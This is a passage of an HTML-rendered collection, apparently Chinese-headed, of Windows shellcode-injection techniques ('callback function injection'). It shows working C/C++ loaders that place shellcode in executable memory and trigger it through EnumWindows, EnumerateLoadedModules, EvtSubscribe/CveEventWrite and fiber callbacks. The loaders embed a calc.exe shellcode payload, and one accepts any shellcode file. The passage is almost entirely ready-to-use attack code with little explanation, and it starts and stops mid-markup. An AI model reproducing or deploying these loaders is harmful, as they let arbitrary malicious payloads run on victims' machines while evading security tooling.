hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"</span><br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xb1\xff\x53\xe2\xfd\x68\x63\x61"</span><br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x6c\x63\x89\xe2\x52\x52\x53\x53"</span><br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x53\x53\x53\x53\x52\x53\xff\xd7"</span>;<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;shellcode,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode));<br><span class="linenum hljs-number">50</span><br><span class="linenum hljs-number">51</span><br><span class="linenum hljs-number">52</span><br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumWindows((WNDENUMPROC)hAlloc,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">54</span><br><span class="linenum hljs-number">55</span>}<br></code></pre>
<h1 id="h61enumerateloadedmodules"><span>61.回调函数注入 通过 EnumerateLoadedModules</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;dbghelp.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-comment">//&nbsp;Requires&nbsp;dbghelp.lib</span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;::EnumerateLoadedModules(::GetCurrentProcess(),&nbsp;(PENUMLOADED_MODULES_CALLBACK)addr,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>}<br></code></pre>
<h1 id="h62evtsubscribe_cveeventwrite"><span>62.回调函数注入 通过 EvtSubscribe_CVEEventWrite</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Wevtapi.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;winevt.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;EVT_HANDLE&nbsp;hEvent&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">19</span><br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;EvtSubscribe_CveEventWrite.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Read&nbsp;shellcode&nbsp;and&nbsp;setup</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Setup&nbsp;the&nbsp;event&nbsp;subscription&nbsp;and&nbsp;callback</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;hEvent&nbsp;=&nbsp;EvtSubscribe(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-string">L"Application"</span>,&nbsp;<span class="hljs-string">L"*[System/EventID=1]"</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;(EVT_SUBSCRIBE_CALLBACK)hAlloc,&nbsp;EvtSubscribeToFutureEvents);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Generate&nbsp;an&nbsp;event&nbsp;that&nbsp;matches&nbsp;the&nbsp;XPATH&nbsp;query&nbsp;provided&nbsp;to&nbsp;EvtSubscribe</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;CveEventWrite(<span class="hljs-string">L"2022-123456"</span>,&nbsp;<span class="hljs-string">L"Wra7h"</span>);<br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Wait&nbsp;for&nbsp;the&nbsp;event&nbsp;to&nbsp;be&nbsp;written&nbsp;to&nbsp;the&nbsp;log,&nbsp;which&nbsp;will&nbsp;trigger&nbsp;the&nbsp;callback</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;Sleep(<span class="hljs-number">10000</span>);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>CLEANUP:<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(hEvent)<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EvtClose(hEvent);<br><span class="linenum hljs-number">51</span><br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">53</span>}<br><span class="linenum hljs-number">54</span><br><span class="linenum hljs-number">55</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">56</span></span>{<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">68</span><br><span class="linenum hljs-number">69</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">70</span>}<br></code></pre>
<h1 id="h63fibercontextedit"><span>63.回调函数注入 通过 FiberContextEdit</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number">  1</span><span class="hljs-comment">//&nbsp;alfarom256</span><br><span class="linenum hljs-number">  2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number">  3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number">  4</span><br><span class="linenum hljs-number">  5</span><span class="hljs-function"><span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">dummy</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">  6</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">puts</span>(<span class="hljs-string">"Hello&nbsp;Fiber&nbsp;from&nbsp;Dummy"</span>);<br><span class="linenum hljs-number">  7</span>}<br><span class="linenum hljs-number">  8</span><br><span class="linenum hljs-number">  9</span><span class="hljs-comment">//&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 10</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 11</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 12</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 13</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number"> 14</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number"> 15</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number"> 16</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number"> 17</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number"> 18</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number"> 19</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number"> 20</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number"> 21</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number"> 22</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number"> 23</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number"> 24</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number"> 25</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number"> 26</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number"> 27</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number"> 28</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number"> 29</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number"> 30</span><br><span class="linenum hljs-number"> 31</span><br><span class="linenum hljs-number"> 32</span><span class="hljs-comment">//https://github.com/reactos/reactos/blob/2e1aeb12dfd8b44b4b57d377b59ef347dfe3386e/dll/win32/kernel32/client/fiber.c</span><br><span class="linenum hljs-number"> 33</span><span class="hljs-comment">//https://doxygen.reactos.org/dd/d83/ndk_2ketypes_8h_source.html#l00179</span><br><span class="linenum hljs-number"> 34</span><br><span class="linenum hljs-number"> 35</span><br><span class="linenum hljs-number"> 36</span><span class="hljs-comment">//&nbsp;s/o&nbsp;to&nbsp;ch3rn0byl&nbsp;and&nbsp;s4r1n</span><br><span class="linenum hljs-number"> 37</span><span class="hljs-comment">//&nbsp;am&nbsp;I&nbsp;doing&nbsp;s00p3r&nbsp;c001&nbsp;1337&nbsp;gr33tz&nbsp;right?</span><br><span class="linenum hljs-number"> 38</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number"> 39</span><br><span class="linenum hljs-number"> 40</span><br><span class="linenum hljs-number"> 41</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">/*<br><span class="linenum hljs-number"> 42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_TEB.SameTebFlags&nbsp;=&nbsp;_TEB&nbsp;+&nbsp;0x17ee<br><span class="linenum hljs-number"> 43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dt&nbsp;_TEB:<br><span class="linenum hljs-number"> 44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;truncated&gt;<br><span class="linenum hljs-number"> 45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;SameTebFlags&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Uint2B<br><span class="linenum hljs-number"> 46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;SafeThunkCall&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Pos&nbsp;0,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;InDebugPrint&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Pos&nbsp;1,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;HasFiberData&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Pos&nbsp;2,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;SkipThreadAttach&nbsp;:&nbsp;Pos&nbsp;3,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;WerInShipAssertCode&nbsp;:&nbsp;Pos&nbsp;4,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;RanProcessInit&nbsp;&nbsp;&nbsp;:&nbsp;Pos&nbsp;5,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;ClonedThread&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Pos&nbsp;6,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;SuppressDebugMsg&nbsp;:&nbsp;Pos&nbsp;7,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;DisableUserStackWalk&nbsp;:&nbsp;Pos&nbsp;8,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;RtlExceptionAttached&nbsp;:&nbsp;Pos&nbsp;9,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;InitialThread&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Pos&nbsp;10,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;SessionAware&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Pos&nbsp;11,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;LoadOwner&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Pos&nbsp;12,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;LoaderWorker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Pos&nbsp;13,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x17ee&nbsp;SkipLoaderInit&nbsp;&nbsp;&nbsp;:&nbsp;Pos&nbsp;14,&nbsp;1&nbsp;Bit<br><span class="linenum hljs-number"> 61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;truncated&gt;<br><span class="linenum hljs-number"> 62</span>&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br><span class="linenum hljs-number"> 63</span><br><span class="linenum hljs-number"> 64</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//_TEB*&nbsp;teb&nbsp;=&nbsp;NtCurrentTeb();</span><br><span class="linenum hljs-number"> 65</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//NT_TIB*&nbsp;tib&nbsp;=&nbsp;(NT_TIB*)teb;</span><br><span class="linenum hljs-number"> 66</span>&nbsp;&nbsp;&nbsp;&nbsp;<span 